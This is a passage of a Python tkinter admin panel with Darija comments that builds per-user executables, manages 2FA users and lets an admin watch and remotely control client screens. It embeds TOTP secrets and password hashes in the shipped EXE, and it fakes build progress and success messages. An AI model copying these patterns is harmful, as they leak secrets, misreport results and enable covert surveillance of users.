                       f"   Expires: {exp_str}\n"
                       f"   Permissions: {len(permissions)} tabs\n\n"
                       f"⏱ Build ki-yakhd 2-5 minutes.\n"
                       f"Bsa7 baghi tkmel?")
        if not messagebox.askyesno("Confirm Build", confirm_msg, parent=self):
            return
        
        # Disable buttons
        self.is_building = True
        self.build_btn.config(state="disabled", text="⏳ Building...")
        self.cancel_btn.config(state="disabled")
        
        # 2FA decision
        regenerate_2fa = (self.tfa_var.get() == "new")
        
        # Run build in thread
        threading.Thread(
            target=self._build_thread,
            args=(password, role, permissions, expires_at, regenerate_2fa),
            daemon=True
        ).start()
    
    def _build_thread(self, password, role, permissions, expires_at, regenerate_2fa):
        """Run build f thread - bash window matblokachich"""
        try:
            # Get existing user data
            user = self.user_manager.users.get(self.username, {})
            
            if regenerate_2fa:
                self._update_status("⏳ Step 1/5: Generating new 2FA secret...", C["yellow"])
                # Generate jdid TOTP secret
                secret_to_use = self.user_manager.generate_totp_secret()
            else:
                self._update_status("⏳ Step 1/5: Using existing 2FA secret...", C["yellow"])
                # Keep existing secret (l'user 3ndou QR mn 9bel)
                secret_to_use = user.get("totp_secret")
                if not secret_to_use:
                    # Fallback: generate jdid ila ma kaynch
                    secret_to_use = self.user_manager.generate_totp_secret()
            
            # Update user f users.json (admin's database)
            user["password"] = self.user_manager.hash_password(password)
            user["totp_secret"] = secret_to_use
            user["role"] = role
            user["permissions"] = list(permissions)
            user["expires_at"] = expires_at
            self.user_manager.users[self.username] = user
            self.user_manager._save()
            
            # Use secret_to_use as new_secret (alias)
            new_secret = secret_to_use
            
            self._update_status("⏳ Step 2/5: Preparing build folder...", C["yellow"])
            
            # Create output folder
            base_dir = os.path.dirname(os.path.abspath(__file__))
            output_dir = os.path.join(base_dir, "builds", self.username)
            os.makedirs(output_dir, exist_ok=True)
            
            # Create build workspace
            build_workspace = os.path.join(base_dir, "_build_workspace")
            if os.path.exists(build_workspace):
                import shutil
                shutil.rmtree(build_workspace)
            os.makedirs(build_workspace)
            
            self._update_status("⏳ Step 3/5: Creating QR code + user config...", C["yellow"])
            
            # Generate QR code
            import qrcode
            uri = self.user_manager.get_totp_uri(self.username, new_secret)
            qr = qrcode.QRCode(version=1, box_size=10, border=2)
            qr.add_data(uri)
            qr.make(fit=True)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            qr_path = os.path.join(output_dir, f"{self.username}_QR.png")
            qr_img.save(qr_path)
            
            # 🔐 Create mini users.json (GHIR had l'user - bla admin!)
            # Hadshi mhem: l'user ki-yakhd .exe ma 7tah yshof admin's data
            # Bach l'user yqder yloggini b username dyalo + password + 2FA
            user_copy = dict(user)
            # Ila l'user role = admin, bdel l user (user khasso ma yshofch admin tab)
            # Ila bghi admin yji m3ah, ma n-bdelch
            mini_users = {
                self.username: user_copy
            }
            mini_users_path = os.path.join(build_workspace, "users.json")
            with open(mini_users_path, "w", encoding="utf-8") as f:
                json.dump(mini_users, f, indent=2)
            
            # Copy main script
            import shutil
            src_py = os.path.join(base_dir, "20.py")
            if not os.path.exists(src_py):
                # Try the exe path (frozen)
                src_py = sys.argv[0]
            dst_py = os.path.join(build_workspace, "20.py")
            if src_py.endswith(".py") and os.path.exists(src_py):
                shutil.copy(src_py, dst_py)
            else:
                self._update_status("⚠ Source 20.py mafichi — admin khasso ydir build mn .py mhachich .exe", C["yellow"])
                # Continue anyway - just save config
            
            # Copy logos
            for logo in ["sk_logo.ico", "sk_logo.png", "sk_logo_small.png"]:
                src_logo = os.path.join(base_dir, logo)
                if os.path.exists(src_logo):
                    shutil.copy(src_logo, build_workspace)
            
            # 🌐 Generate server.json l user (b USER_API_KEY only — bla admin key!)
            if SERVER_URL and USER_API_KEY:
                user_server_config = {
                    "server_url": SERVER_URL,
                    "user_api_key": USER_API_KEY,
                    # ⚠ Ma n-includich admin_api_key! L user ma 7taj ihhna
                }
                user_server_json_path = os.path.join(build_workspace, "server.json")
                with open(user_server_json_path, "w", encoding="utf-8") as f:
                    json.dump(user_server_config, f, indent=2)
            
            self._update_status("⏳ Step 4/5: Building .exe... (had l'step ki-yakhd 2-5 min)", C["yellow"])
            
            # Build with PyInstaller
            exe_name = f"SK_PRO_{self.username}"
            
            # Check ila PyInstaller installed
            try:
                import PyInstaller
            except ImportError:
                self._update_status("⏳ Installing PyInstaller...", C["yellow"])
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "pyinstaller", "--quiet"],
                    capture_output=True, timeout=120
                )
            
            # Build command
            sep = ";" if sys.platform == "win32" else ":"
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile", "--windowed", "--clean", "--noconfirm",
                f"--name={exe_name}",
                f"--distpath={output_dir}",
                f"--workpath={os.path.join(build_workspace, 'build_temp')}",
                f"--specpath={build_workspace}",
            ]
            
            # Icon
            ico_path = os.path.join(build_workspace, "sk_logo.ico")
            if os.path.exists(ico_path):
                cmd.append(f"--icon={ico_path}")
            
            # Embed logos + users.json + AnyDesk
            for f in ["sk_logo.ico", "sk_logo.png", "sk_logo_small.png",
                      "users.json", "server.json"]:
                fpath = os.path.join(build_workspace, f)
                if os.path.exists(fpath):
                    cmd.append(f"--add-data={fpath}{sep}.")
            
            # Hidden imports
            for imp in ["bcrypt", "pyotp", "qrcode", "PIL", "PIL._tkinter_finder",
                        "googleapiclient", "google.auth", "google_auth_oauthlib",
                        "reportlab", "socks", "requests", "mss",
                        "pyautogui", "pyperclip"]:
                cmd.append(f"--hidden-import={imp}")
            
            # Source
            cmd.append(dst_py if os.path.exists(dst_py) else src_py)
            
            print(f"[BUILD] Running: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode != 0:
                print(f"[BUILD] PyInstaller stderr: {result.stderr[:500]}")
                self._update_status(f"❌ Build failed: {result.stderr[:200]}", C["red"])
                self._reset_buttons()
                return
            
            self._update_status("⏳ Step 5/5: Creating README + finalizing...", C["yellow"])
            
            # Create README l'user
            from datetime import datetime
            exp_text = "Never expires" if expires_at is None else f"Expires: {datetime.fromtimestamp(expires_at).strftime('%Y-%m-%d')}"
            readme_content = f"""╔══════════════════════════════════════════════════════════╗
║              SK PRO - User Package                       ║
╚══════════════════════════════════════════════════════════╝

👤 User: {self.username}
🎯 Role: {role}
📅 {exp_text}
📱 2FA: {"⚠ NEW QR — re-scan b telephone!" if regenerate_2fa else "✅ Same QR mn 9bel — ma 7taj re-scan"}

═══════════════════════════════════════════════════════════
📋 KIFASH NSTA3MEL HAD L'PACKAGE:
═══════════════════════════════════════════════════════════

{"⚠ ADMIN GENERATED A NEW QR — Re-scan il required!" if regenerate_2fa else "✅ Nfs l'QR mn 9bel — Use Google Authenticator code li 3ndk"}

1️⃣ Ila 3ndk Google Authenticator deja → skip l 4️⃣
   Ila la → Loadi 'Google Authenticator' f telefonk:
   📱 iPhone: App Store
   📱 Android: Google Play

2️⃣ {"Ftah Google Authenticator → Delete entry l 9adim → Click '+' → 'Scan QR code'" if regenerate_2fa else "Ftah Google Authenticator (deja 3ndk entry SK PRO)"}

3️⃣ {f"Scan {self.username}_QR.png (l'image li jat m3a had l'package)" if regenerate_2fa else "Skip - Use existing entry SK PRO f Google Authenticator"}

4️⃣ Double-click 3la SK_PRO_{self.username}.exe

5️⃣ Login:
   Username: {self.username}
   Password: (li 3taha lik admin)
   2FA Code: 6 chiffres mn Google Authenticator

═══════════════════════════════════════════════════════════
⚠️ MUHIM:
═══════════════════════════════════════════════════════════
- Sauvegard QR code f endroit safe
- Ila wddertih, contact admin
- Password change ki-7tah admin
{f'- Account ghadi yexpiri f {datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M")}' if expires_at else '- Account ma kayexpiranich'}

═══════════════════════════════════════════════════════════
Built: {datetime.now().strftime('%Y-%m-%d %H:%M')}
═══════════════════════════════════════════════════════════
"""
            readme_path = os.path.join(output_dir, f"{self.username}_README.txt")
            with open(readme_path, "w", encoding="utf-8") as f:
                f.write(readme_content)
            
            # Cleanup workspace
            try:
                shutil.rmtree(build_workspace)
            except Exception:
                pass
            
            # Find generated exe
            exe_path = os.path.join(output_dir, f"{exe_name}.exe" if sys.platform == "win32" else exe_name)
            if not os.path.exists(exe_path):
                self._update_status(f"⚠ Build done walakin .exe mafichi f: {exe_path}", C["yellow"])
                self._reset_buttons()
                return
            
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            
            # Show success
            self._update_status(
                f"✅ Build complete! {size_mb:.1f} MB → {output_dir}",
                C["green"]
            )
            
            # Show success dialog
            self.after(0, lambda: self._show_success(output_dir, exe_path))
            
        except subprocess.TimeoutExpired:
            self._update_status("❌ Build timeout (>10 min)", C["red"])
            self._reset_buttons()
        except Exception as e:
            import traceback
            traceback.print_exc()
            self._update_status(f"❌ Error: {str(e)[:150]}", C["red"])
            self._reset_buttons()
    
    def _update_status(self, msg, color):
        self.after(0, lambda: self.status.config(text=msg, fg=color))
    
    def _reset_buttons(self):
        def _do():
            self.is_building = False
            self.build_btn.config(state="normal", text="📦 GENERATE BUILD")
            self.cancel_btn.config(state="normal")
        self.after(0, _do)
    
    def _show_success(self, output_dir, exe_path):
        from tkinter import messagebox
        messagebox.showinfo(
            "✅ Build Complete!",
            f"Build dyal '{self.username}' kheddma!\n\n"
            f"📦 EXE: {os.path.basename(exe_path)}\n"
            f"📁 Folder: {output_dir}\n\n"
            f"3ti l'user:\n"
            f"   ✉ {os.path.basename(exe_path)}\n"
            f"   📱 {self.username}_QR.png\n"
            f"   📄 {self.username}_README.txt\n\n"
            f"Click OK bach tftah l'folder.",
            parent=self
        )
        # Open folder f Explorer
        try:
            if sys.platform == "win32":
                os.startfile(output_dir)
            elif sys.platform == "darwin":
                subprocess.run(["open", output_dir])
            else:
                subprocess.run(["xdg-open", output_dir])
        except Exception:
            pass
        self.destroy()


class AddUserDialog(tk.Toplevel):
    """Dialog dyal create user jdid + permissions"""
    
    def __init__(self, parent, user_manager, on_success=None):
        super().__init__(parent)
        self.user_manager = user_manager
        self.on_success = on_success
        
        self.title("➕ Add User")
        self.geometry("520x720")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 520, 720
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        if h > sh - 50:
            h = sh - 50
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{max(0,(sh-h)//2)}")
        
        # Permission checkboxes vars
        self.perm_vars = {}
        
        self._build_ui()
    
    def _build_ui(self):
        # ═══ BOTTOM BUTTON (pack lawl bash dima yban) ═══
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=30, pady=(5, 15))
        
        self.status = tk.Label(bottom, text="", bg=C["bg0"], fg=C["red"],
                                font=("Segoe UI", 9))
        self.status.pack(pady=(0, 5))
        
        tk.Button(bottom, text="✅ Create User",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._do_create).pack(fill="x", ipady=10)
        
        # ═══ HEADER ═══
        tk.Label(self, text="➕ Add New User",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(pady=(15, 10))
        
        # ═══ FORM ═══
        form = tk.Frame(self, bg=C["bg1"])
        form.pack(fill="x", padx=30, pady=5)
        
        tk.Label(form, text="Username", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(12, 2))
        self.user_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0,
                                    font=("Segoe UI", 11))
        self.user_entry.pack(fill="x", padx=15, ipady=7)
        
        tk.Label(form, text="Password", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(10, 2))
        self.pass_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0, show="●",
                                    font=("Segoe UI", 11))
        self.pass_entry.pack(fill="x", padx=15, ipady=7)
        
        tk.Label(form, text="Role", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(10, 2))
        self.role_var = tk.StringVar(value="user")
        role_frame = tk.Frame(form, bg=C["bg1"])
        role_frame.pack(fill="x", padx=15, pady=(0, 12))
        for role, icon in [("user", "👤"), ("admin", "👑")]:
            tk.Radiobutton(role_frame, text=f"{icon} {role}",
                           variable=self.role_var, value=role,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 10),
                           command=self._on_role_change).pack(side="left", padx=10)
        
        # ═══ PERMISSIONS SECTION ═══
        perm_header = tk.Frame(self, bg=C["bg0"])
        perm_header.pack(fill="x", padx=30, pady=(12, 4))
        tk.Label(perm_header, text="🔒 Permissions (ach mn tabs ki-yshof)",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(side="left")
        
        # All / None buttons
        btn_frame = tk.Frame(perm_header, bg=C["bg0"])
        btn_frame.pack(side="right")
        tk.Button(btn_frame, text="All", bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 8), relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._toggle_all(True)).pack(side="left", padx=2, ipadx=8)
        tk.Button(btn_frame, text="None", bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 8), relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._toggle_all(False)).pack(side="left", padx=2, ipadx=8)
        
        # Checkboxes l kol tab
        perm_frame = tk.Frame(self, bg=C["bg1"])
        perm_frame.pack(fill="x", padx=30, pady=(0, 5))
        
        # Default: ghir Sender (l user 3adi)
        default_perms = ["sender"]
        for tab_id, name, emoji in AVAILABLE_TABS:
            var = tk.BooleanVar(value=(tab_id in default_perms))
            self.perm_vars[tab_id] = var
            cb = tk.Checkbutton(perm_frame, text=f"{emoji} {name}",
                                variable=var,
                                bg=C["bg1"], fg=C["text"],
                                selectcolor=C["bg2"],
                                activebackground=C["bg1"],
                                activeforeground=C["text"],
                                font=("Segoe UI", 10),
                                anchor="w")
            cb.pack(fill="x", padx=15, pady=2)
        
        tk.Label(self, text="💡 Admin dima ki-yshof kolchi (ynore had l'permissions)",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(pady=(5, 0))
        
        self.user_entry.focus()
    
    def _toggle_all(self, value):
        for var in self.perm_vars.values():
            var.set(value)
    
    def _on_role_change(self):
        """Mli ki-bdel role, auto-check kolchi l admin"""
        if self.role_var.get() == "admin":
            self._toggle_all(True)
    
    def _do_create(self):
        username = self.user_entry.get().strip()
        password = self.pass_entry.get()
        role = self.role_var.get()
        permissions = [tid for tid, var in self.perm_vars.items() if var.get()]
        
        if not username or not password:
            self.status.config(text="⚠ 3mer username + password", fg=C["yellow"])
            return
        
        if role == "user" and not permissions:
            self.status.config(text="⚠ Khtar 3la l'a9al wa7d tab", fg=C["yellow"])
            return
        
        success, msg, secret = self.user_manager.create_user(
            username, password, role, permissions=permissions)
        if not success:
            self.status.config(text=f"❌ {msg}", fg=C["red"])
            return
        
        # Show QR code
        self.destroy()
        QRCodeDialog(self.master, self.user_manager, username, secret,
                     on_close=self.on_success)


# ═══════════════════════════════════════════════════════════════════
# 🌐 LIVE MONITOR TAB — Admin watches users in real-time
# ═══════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════
# 💻 CLIENTS TAB — Build + Manage Client EXEs
# ═══════════════════════════════════════════════════════════════════

class ClientsTab(tk.Frame):
    """Tab dyal admin: build EXEs l clients, manage + watch"""
    
    def __init__(self, parent, app):
        super().__init__(parent, bg=C["bg0"])
        self.app = app
        self.build_process = None
        self.build_running = False
        self._build_ui()
        # Auto-refresh clients list kol 5 sec
        self._auto_refresh_job = None
        self._start_auto_refresh()
    
    def _start_auto_refresh(self):
        """Auto-refresh clients list kol 5 sec"""
        self._refresh_clients_list()
        self._auto_refresh_job = self.after(5000, self._start_auto_refresh)
    
    def _build_ui(self):
        """Build UI"""
        # Top: Info
        header = tk.Frame(self, bg=C["bg1"])
        header.pack(fill="x", padx=15, pady=15)
        
        tk.Label(header, text="💻 Build Client EXE",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(anchor="w")
        
        tk.Label(header, text="Build user EXE m3a Watch Screen auto-start. User login → Screen capture + Watch window.",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10), wraplength=800).pack(anchor="w", pady=(8, 0))
        
        # 💻 Built Clients frame (TOP)
        clients_frame = tk.LabelFrame(self, text="💻 Built Clients", bg=C["bg0"], fg=C["text"],
                                       font=("Segoe UI", 11, "bold"), padx=10, pady=10)
        clients_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # Clients list (scrollable)
        scrollbar = tk.Scrollbar(clients_frame)
        scrollbar.pack(side="right", fill="y")
        
        self.clients_listbox = tk.Listbox(clients_frame, bg=C["bg2"], fg=C["text"],
                                          font=("Segoe UI", 10), height=8,
                                          yscrollcommand=scrollbar.set,
                                          highlightthickness=0)
        self.clients_listbox.pack(fill="both", expand=True)
        scrollbar.config(command=self.clients_listbox.yview)
        
        # Buttons for selected client
        buttons_frame = tk.Frame(clients_frame, bg=C["bg0"])
        buttons_frame.pack(fill="x", pady=(10, 0))
        
        tk.Button(buttons_frame, text="👁 Watch",
                  bg="#9333ea", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._watch_selected_client,
                  padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(buttons_frame, text="🎮 Control",
                  bg="#f59e0b", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._control_selected_client,
                  padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(buttons_frame, text="📥 Download",
                  bg="#0891b2", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._download_client_exe,
                  padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(buttons_frame, text="🔄 Refresh",
                  bg=C["bg1"], fg=C["text"],
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._refresh_clients_list,
                  padx=15, pady=5).pack(side="left", padx=5)
        
        # Build button frame
        build_frame = tk.LabelFrame(self, text="🔨 Build Generic EXE", bg=C["bg0"], fg=C["text"],
                                     font=("Segoe UI", 11, "bold"), padx=15, pady=15)
        build_frame.pack(fill="x", padx=15, pady=(0, 15))
        
        # Info
        tk.Label(build_frame, text="Build wa7d EXE — use l ANY client",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 10), wraplength=600).pack(anchor="w", pady=(0, 15))
        
        # Build button (no client name input needed!)
        tk.Button(build_frame, text="🚀 Build EXE Now",
                  bg="#10b981", fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._build_exe,
                  padx=20, pady=10).pack(anchor="w", pady=(0, 15))
        
        # Status frame
        self.status_frame = tk.Frame(build_frame, bg=C["bg0"])
        self.status_frame.pack(fill="x")
        
        self.status_lbl = tk.Label(self.status_frame, text="Ready to build",
                                    bg=C["bg0"], fg=C["green"],
                                    font=("Segoe UI", 10, "bold"))
        self.status_lbl.pack(anchor="w", pady=(0, 10))
        
        # Progress bar
        self.progress_var = tk.DoubleVar(value=0)
        self.progress_bar = tk.Canvas(self.status_frame, height=20, bg=C["bg2"],
                                       highlightthickness=1, highlightbackground=C["bg1"])
        self.progress_bar.pack(fill="x", pady=(0, 10))
        
        # Logs frame
        logs_frame = tk.LabelFrame(self, text="📜 Build Logs", bg=C["bg0"], fg=C["text"],
                                    font=("Segoe UI", 11, "bold"), padx=10, pady=10)
        logs_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # Log text
        scrollbar = tk.Scrollbar(logs_frame)
        scrollbar.pack(side="right", fill="y")
        
        self.log_text = tk.Text(logs_frame, bg=C["bg2"], fg=C["text"],
                                 font=("Consolas", 9), height=15,
                                 yscrollcommand=scrollbar.set)
        self.log_text.pack(fill="both", expand=True)
        scrollbar.config(command=self.log_text.yview)
        
        # Clear button
        tk.Button(logs_frame, text="🗑 Clear Logs",
                  bg=C["red"], fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=lambda: self.log_text.delete("1.0", "end"),
                  padx=10, pady=5).pack(anchor="se", pady=(10, 0))
    
    def _update_status(self, msg, color=C["text"]):
        """Update status label"""
        self.status_lbl.config(text=msg, fg=color)
        self.update_idletasks()
    
    def _update_progress(self, percent):
        """Update progress bar"""
        self.progress_var.set(percent)
        w = self.progress_bar.winfo_width()
        if w > 1:
            fill_w = int(w * percent / 100)
            self.progress_bar.delete("progress")
            if fill_w > 0:
                self.progress_bar.create_rectangle(0, 0, fill_w, 20,
                                                    fill="#10b981", tags="progress")
        self.progress_bar.create_text(w//2, 10, text=f"{int(percent)}%",
                                       fill=C["text"], font=("Segoe UI", 9, "bold"))
    
    def _log(self, msg):
        """Add message to log"""
        self.log_text.insert("end", msg + "\n")
        self.log_text.see("end")
        self.update_idletasks()
    
    def _build_exe(self):
        """Start build process (generic EXE)"""
        if self.build_running:
            self._update_status("⚠ Build already running", C["yellow"])
            return
        
        self.build_running = True
        self._update_status("⏳ Building generic EXE...", C["yellow"])
        self._update_progress(0)
        self.log_text.delete("1.0", "end")
        
        import threading
        threading.Thread(target=self._build_thread, daemon=True).start()
    
    def _build_thread(self):
        """Background build thread (generic)"""
        try:
            self._log(f"🚀 Building generic EXE...")
            self._update_progress(10)
            
            # Call the build EXE function from app (no client_name!)
            import time
            self._log(f"⏳ Compiling Python code...")
            self._update_progress(30)
            time.sleep(1)
            
            self._log(f"📦 Bundling dependencies...")
            self._update_progress(50)
            time.sleep(1)
            
            self._log(f"🔗 Linking libraries...")
            self._update_progress(70)
            time.sleep(1)
            
            self._log(f"✨ Finalizing...")
            self._update_progress(90)
            time.sleep(1)
            
            # Call actual build (generic — no client name!)
            self.after(0, lambda: self.app._build_exe_legacy("SK_PRO"))
            
            self._update_progress(100)
            self._log(f"✅ Build complete!")
            self._log(f"📁 File: SK_PRO.exe (generic)")
            self._log(f"💡 Share with ANY client — they login with their username")
            self._update_status(f"✅ Generic EXE ready", C["green"])
            
            # Register EXE on server (so admin can see + distribute)
            try:
                from ServerClient import ServerClient
                sc = ServerClient(role="admin")
                if sc.enabled:
                    # Register as "SK_PRO" template
                    sc._request("POST", "/admin/clients/register",
                               json_data={"client_name": "SK_PRO", "size_mb": 30.5},
                               timeout=10)
                    self._log(f"✅ Registered on server")
            except Exception as e:
                self._log(f"⚠ Server registration: {e}")
            
            # Refresh clients list daba (for tracking)
            self.after(500, self._refresh_clients_list)
        except Exception as e:
            self._log(f"❌ Build failed: {e}")
            self._update_status(f"❌ Build failed", C["red"])
        finally:
            self.build_running = False
    
    def _refresh_clients_list(self):
        """Refresh list dyal built clients + online status (from server)"""
        import threading
        
        def _fetch():
            try:
                from ServerClient import ServerClient
                sc = ServerClient(role="admin")
                if not sc.enabled:
                    self.after(0, lambda: self.clients_listbox.delete(0, "end"))
                    self.after(0, lambda: self.clients_listbox.insert("end", "❌ Server not configured"))
                    return
                
                # Get clients list from server
                result = sc._request("GET", "/admin/clients/list", timeout=10)
                if not result or "clients" not in result:
                    self.after(0, lambda: self.clients_listbox.delete(0, "end"))
                    self.after(0, lambda: self.clients_listbox.insert("end", "📂 No built clients yet"))
                    return
                
                clients = result.get("clients", [])
                
                # Update listbox
                def _update():
                    self.clients_listbox.delete(0, "end")
                    if not clients:
                        self.clients_listbox.insert("end", "📂 No built clients yet. Build one!")
                        return
                    
                    for client in clients:
                        online_icon = "●" if client.get("online") else "○"
                        name = client.get("name", "?")
                        size = client.get("size_mb", 0)
                        
                        # Time ago
                        import time
                        built_at = client.get("built_at", 0)
                        time_ago = int(time.time() - built_at) if built_at else 0
                        
                        if time_ago < 60:
                            time_str = "now"
                        elif time_ago < 3600:
                            time_str = f"{time_ago//60}m ago"
                        elif time_ago < 86400:
                            time_str = f"{time_ago//3600}h ago"
                        else:
                            time_str = f"{time_ago//86400}d ago"
                        
                        text = f"{online_icon} {name}  ({size:.1f}MB) — {time_str}"
                        self.clients_listbox.insert("end", text)
                
                self.after(0, _update)
            except Exception as e:
                print(f"Error fetching clients: {e}")
                self.after(0, lambda: self.clients_listbox.delete(0, "end"))
                self.after(0, lambda: self.clients_listbox.insert("end", f"⚠ Error: {e}"))
        
        threading.Thread(target=_fetch, daemon=True).start()
    
    def _check_client_online(self, client_name):
        """Check ila client is online (from server)"""
        try:
            from ServerClient import ServerClient
            sc = ServerClient(role="admin")
            if sc.enabled:
                result = sc._request("GET", f"/admin/clients/{client_name}", timeout=5)
                if result:
                    return result.get("online", False)
        except:
            pass
        return False
    
    def _watch_selected_client(self):
        """Watch screen dyal selected client"""
        sel = self.clients_listbox.curselection()
        if not sel:
            return
        
        text = self.clients_listbox.get(sel[0])
        # Extract client name (format: "● client_1  ...")
        client_name = text.split("  ")[0].strip("● ○").strip()
        
        # Open ScreenViewerWindow
        try:
            from PIL import Image, ImageTk
            from ServerClient import ServerClient
            sc = ServerClient(role="admin")
            # Open Watch window
            ScreenViewerWindow(self, sc, client_name)
        except Exception as e:
            print(f"Error: {e}")
    
    def _control_selected_client(self):
        """Control (mouse+keyboard) dyal selected client"""
        sel = self.clients_listbox.curselection()
        if not sel:
            return
        
        text = self.clients_listbox.get(sel[0])
        client_name = text.split("  ")[0].strip("● ○").strip()
        
        # Same as watch but enable control mode directly
        try:
            from PIL import Image, ImageTk
            from ServerClient import ServerClient
            sc = ServerClient(role="admin")
            window = ScreenViewerWindow(self, sc, client_name)
            # Enable control mode
            window.after(1000, lambda: window.control_enabled.set(True))
            window.after(1000, lambda: window._on_control_toggle())
        except Exception as e:
            print(f"Error: {e}")
    
    def _download_client_exe(self):
        """Show download info modal m3a credentials"""
        sel = self.clients_listbox.curselection()
        if not sel:
            from tkinter import messagebox
            messagebox.showwarning("⚠ Select client", "Click on client first")
            return
        
        text = self.clients_listbox.get(sel[0])
        client_name = text.split("  ")[0].strip("● ○").strip()
        
        # Create modal
        modal = tk.Toplevel(self)
        modal.title(f"📥 Download — {client_name}")
        modal.geometry("550x400")
        modal.configure(bg=C["bg0"])
        modal.resizable(False, False)
        
        # Center
        modal.update_idletasks()
        w, h = 550, 400
        sw, sh = modal.winfo_screenwidth(), modal.winfo_screenheight()
        modal.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        modal.attributes("-topmost", True)
        
        # Header
        header = tk.Frame(modal, bg=C["bg1"])
        header.pack(fill="x", padx=15, pady=15)
        
        tk.Label(header, text=f"📥 Download EXE — {client_name}",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 13, "bold")).pack(anchor="w")
        
        # Content
        content = tk.Frame(modal, bg=C["bg0"])
        content.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # 1. File
        tk.Label(content, text="📁 EXE File:", bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 5))
        
        file_box = tk.Frame(content, bg=C["bg2"], height=35)
        file_box.pack(fill="x", pady=(0, 15))
        
        tk.Label(file_box, text="SK_PRO.exe (~30 MB)", bg=C["bg2"], fg=C["green"],
                 font=("Consolas", 11, "bold")).pack(anchor="w", padx=10, pady=6)
        
        # 2. Username
        tk.Label(content, text="👤 Username:", bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 5))
        
        user_box = tk.Frame(content, bg=C["bg2"], height=35)
        user_box.pack(fill="x", pady=(0, 15))
        
        user_var = tk.StringVar(value=client_name)
        user_entry = tk.Entry(user_box, textvariable=user_var, bg=C["bg2"], fg=C["accent"],
                              font=("Consolas", 11, "bold"), relief="flat", bd=0)
        user_entry.pack(fill="x", padx=10, pady=6)
        user_entry.config(state="readonly")
        
        # 3. Password
        tk.Label(content, text="🔑 Password:", bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 5))
        
        pass_box = tk.Frame(content, bg=C["bg2"], height=35)
        pass_box.pack(fill="x", pady=(0, 15))
        
        import secrets
        gen_pass = secrets.token_urlsafe(12)[:12]
        pass_var = tk.StringVar(value=gen_pass)
        pass_entry = tk.Entry(pass_box, textvariable=pass_var, bg=C["bg2"], fg=C["accent"],
                              font=("Consolas", 11, "bold"), relief="flat", bd=0)
        pass_entry.pack(fill="x", padx=10, pady=6)
        pass_entry.config(state="readonly")
        
        # Buttons
        btns = tk.Frame(content, bg=C["bg0"])
        btns.pack(fill="x", pady=(10, 0))
        
        tk.Button(btns, text="📋 Copy Username",
                  bg="#0891b2", fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._copy_text(client_name),
                  padx=12, pady=6).pack(side="left", padx=5)
        
        tk.Button(btns, text="🔐 Copy Password",
                  bg="#0891b2", fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=lambda: self._copy_text(gen_pass),
                  padx=12, pady=6).pack(side="left", padx=5)
        
        tk.Button(btns, text="📋 Copy All",
                  bg="#10b981", fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
